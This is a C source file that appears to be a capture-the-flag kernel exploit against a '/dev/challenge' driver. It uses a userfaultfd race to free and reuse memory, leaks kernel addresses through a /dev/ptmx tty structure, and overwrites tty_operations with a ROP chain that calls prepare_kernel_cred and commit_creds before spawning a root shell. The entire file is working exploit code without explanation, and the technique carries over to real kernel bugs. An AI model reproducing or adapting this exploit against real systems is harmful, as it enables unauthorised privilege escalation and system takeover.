#define _GNU_SOURCE

#include <init.h>
#include <sxattr_uffd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

struct tty_operations
{
    void *(*lookup)(void *driver,
                    void *filp, int idx);
    int (*install)(void *driver, void *tty);
    void (*remove)(void *driver, void *tty);
    int (*open)(void *tty, void *filp);
    void (*close)(void *tty, void *filp);
    void (*shutdown)(void *tty);
    void (*cleanup)(void *tty);
    int (*write)(void *tty,
                 const unsigned char *buf, int count);
    int (*put_char)(void *tty, unsigned char ch);
    void (*flush_chars)(void *tty);
    int (*write_room)(void *tty);
    int (*chars_in_buffer)(void *tty);
    int (*ioctl)(void *tty,
                 unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(void *tty,
                         unsigned int cmd, unsigned long arg);
    void (*set_termios)(void *tty, void *old);
    void (*throttle)(void *tty);
    void (*unthrottle)(void *tty);
    void (*stop)(void *tty);
    void (*start)(void *tty);
    void (*hangup)(void *tty);
    int (*break_ctl)(void *tty, int state);
    void (*flush_buffer)(void *tty);
    void (*set_ldisc)(void *tty);
    void (*wait_until_sent)(void *tty, int timeout);
    void (*send_xchar)(void *tty, char ch);
    int (*tiocmget)(void *tty);
    int (*tiocmset)(void *tty,
                    unsigned int set, unsigned int clear);
    int (*resize)(void *tty, void *ws);
    int (*set_termiox)(void *tty, void *tnew);
    int (*get_icount)(void *tty,
                      void *icount);
    void (*show_fdinfo)(void *tty, void *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(void *driver, int line, char *options);
    int (*poll_get_char)(void *driver, int line);
    void (*poll_put_char)(void *driver, int line, char ch);
#endif
    int (*proc_show)(void *, void *);
};

#define DEVICE "/dev/challenge"

typedef struct request {
    int id;
    int pad;
    uint64_t value;
    int size;
    int pad_;
    char *buf;
} request_t;

enum CMD
{
    ALLOC = 0x13370001,
    EDIT,
    VIEW,
    DEL
};

#define PAGE1 0xdeadbeaf000
#define PAGE2 0x13371337000

void alloc(int id, uint64_t value, char *buf, int size) {
    request_t req = {
        .id = id, .size = size,
        .value = value,
        .buf = buf
    };
    ioctl(g_fd, ALLOC, &req);
}

void edit(int id, uint64_t value, char *buf, int size) {
    request_t req = {
        .id = id,
        .size = size,
        .value = value,
        .buf = buf
    };
    ioctl(g_fd, EDIT, &req);
}

void view(int id, char *buf, int size) {
    request_t req = {
        .id = id,
        .size = size,
        .buf = buf
    };
    ioctl(g_fd, VIEW, &req);
}

void del(int id) {
    request_t req = {.id = id};
    ioctl(g_fd, DEL, &req);
}

int ptmx_fd;
void leak() {
    del(0);
    ptmx_fd = open_dev("/dev/ptmx", O_RDONLY | O_NOCTTY);
}

u64 pop_4 = 0x584a9e, leave_ret = 0xe921, pop_rdi = 0x1db4, mov_rdi_rax = 0x3b3c80, pop_rsi = 0x1ffa;
void overwrite_ops() {
    del(0);
    memcpy(uf_buffer, PAGE1, PAGE_SIZE);
    uf_buffer[2] = heap_leak;
    uf_buffer[76] = heap_leak - 0x198;
    ptmx_fd = open_dev("/dev/ptmx", O_RDONLY | O_NOCTTY);
}

int main() {
    cpu_set_t pwn_cpu;
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu)){
        log_error("sched_setaffinity");
    }
    save_state();
    commit_creds = +0x00092c60, prepare_kernel_cred = +0x00092f00, \
    swapgs_restore_regs_and_return_to_usermode = +0x00e00df0;
    g_fd = open_dev(DEVICE, O_RDWR);


    alloc(0, 0x41414141,"chino\x00\x00\x00", 0x8);
    createThreadUserFault(PAGE1, leak, 1);
    view(0, PAGE1, 0x2e0);
    sleep(2);
    close(ptmx_fd);

    uint64_t* buf = (uint64_t*)PAGE1;
    kbase = buf[2] - 0x12752c0;
    heap_leak = buf[61];
    gadget();

    calc_addr("leave_ret", leave_ret, 1);
    calc_addr("pop_4", pop_4, 1);
    calc_addr("pop_rdi", pop_rdi, 1);
    calc_addr("mov_rdi_rax", mov_rdi_rax, 1);
    calc_addr("pop_rsi", pop_rsi, 1);
    struct tty_operations fake_tty = {.close = leave_ret};
    alloc(0, 0x41414141, &fake_tty, sizeof(fake_tty));

    u64 *payload = (u64*)&fake_tty;
    payload[1] = pop_4;
    int idx = 6;
    payload[idx++] = pop_rdi;
    payload[idx++] = 0;
    payload[idx++] = prepare_kernel_cred;
    payload[idx++] = pop_rsi;
    payload[idx++] = 0;
    payload[idx++] = mov_rdi_rax;
    payload[idx++] = 0;
    payload[idx++] = commit_creds;
    payload[idx++] = swapgs_restore_regs_and_return_to_usermode+22;
    payload[idx++] = 0;
    payload[idx++] = 0;
    payload[idx++] = (uint64_t*)get_shell;
    payload[idx++] = user_cs;
    payload[idx++] = user_rflags;
    payload[idx++] = user_sp;
    payload[idx++] = user_ss;

    alloc(1, 0x100005401, (u64)&fake_tty + 8, sizeof(fake_tty));
    createThreadUserFault(PAGE2, overwrite_ops, 0);
    edit(0, 0x100005401, PAGE2, 0x2f0);
    close(ptmx_fd);
}